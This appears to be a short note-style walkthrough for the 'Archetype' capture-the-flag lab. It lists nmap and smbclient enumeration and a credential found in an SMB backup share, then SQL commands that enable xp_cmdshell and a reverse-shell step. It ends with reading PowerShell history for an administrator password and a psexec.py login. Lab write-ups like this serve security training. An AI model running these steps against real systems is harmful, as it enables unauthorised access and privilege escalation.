- nmap it
	- 135: msrpc
	- 139: netbios-ssn
	- 445: Microsoft Server 2008 
		- likely vulnerable Samba
		- add `nmap --script smb-os-discovery <ip>`
			- → Computer name: Archetype
	- 1433: SQL server 2017 14.00.1000
		- CVEs: CVE-2021-1636, CVE-2019-1068, CVE-2019-0819
	- 

- smb
	- `smbclient -N -L //<IP>/`
		- list (-L) directories with no password (-N)
			- ADMINS\$ → nothing
			- backups 
				- → can sign in - backup file
					- `get <FILE> <>`
					- Username: `ARCHETYPE\sql_svc` 
					- Password: `M3g4c0rp123` 
					- Provider SQL
			- C\$ → nothing
			- IPC\$ → nothing

- SQL
	- connect to SQL: `mssqlclient ARCHETYPE\sql_svc:M3g4c0rp123@<IP> -windows-auth`
	- set up xp_cmdshell
		- ```
			EXEC sp_configure 'Show Advanced Options', 1;
			reconfigure;  
			sp_configure;  
			EXEC sp_configure 'xp_cmdshell', 1  
			reconfigure;  
			xp_cmdshell "whoami"
		- run each on their own line
	- make shell.ps1 Powershell reverse shell script
	- run Python server
	- set up listerer
	- get access to the machine
		- find user flag in `C:\Users\sql_svc\Desktop`

- privilege escalation
	- check frequently access/execute file:
		- `type    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
		- → `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! `
		- Administrator: `Administrator`
		- Password: `MEGACORP_4dm1n!!`

- sign in to machine as Administrator
	- `psexec.py administrator@<IP>`
	- get Administrator's flag in `C:\Users\Administrator\Desktop`